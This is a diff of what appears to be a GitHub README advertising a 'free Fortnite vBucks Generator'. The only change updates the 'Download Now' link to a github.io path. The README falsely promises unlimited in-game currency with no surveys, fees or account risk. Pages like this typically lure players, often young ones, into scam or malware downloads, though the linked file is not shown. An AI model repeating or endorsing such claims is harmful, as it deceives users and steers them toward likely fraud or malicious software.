@@ -2,7 +2,7 @@
 
 🚀 The most advanced free Fortnite vBucks Generator available in 2025! Our cutting-edge tool provides instant access to unlimited vBucks without any surveys, hidden fees, or risks to your account. Whether you need skins, battle passes, or in-game cosmetics - we've got you covered!
 
-🔥 [![Download Now](https://img.shields.io/badge/Download-INSTANT_ACCESS-red?style=for-the-badge&logo=fortnite)](https://fortnite-vbucks-generator.github.io/.github/)
+🔥 [![Download Now](https://img.shields.io/badge/Download-INSTANT_ACCESS-red?style=for-the-badge&logo=fortnite)](https://fortnite-vbucks-generator.github.io/.github/vbucksgenerator)
 
 ---
 
